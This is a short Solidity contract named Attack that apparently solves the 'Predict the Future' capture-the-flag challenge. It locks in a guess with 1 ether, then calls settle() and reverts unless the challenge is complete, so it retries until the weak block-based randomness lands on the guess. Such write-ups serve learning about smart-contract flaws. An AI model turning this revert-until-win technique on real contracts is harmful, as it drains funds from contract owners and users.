pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

contract Attack {

    PredictTheFutureChallenge target;

    function Attack(address _targetAddress) public payable {
        target = PredictTheFutureChallenge(_targetAddress);
    }

    function lockInGuess(uint8 answer) external payable {
        target.lockInGuess.value(1 ether)(answer);
    }
    
    function _attack() external payable {
        target.settle();
        require(target.isComplete());
    }

    function() public payable {}
}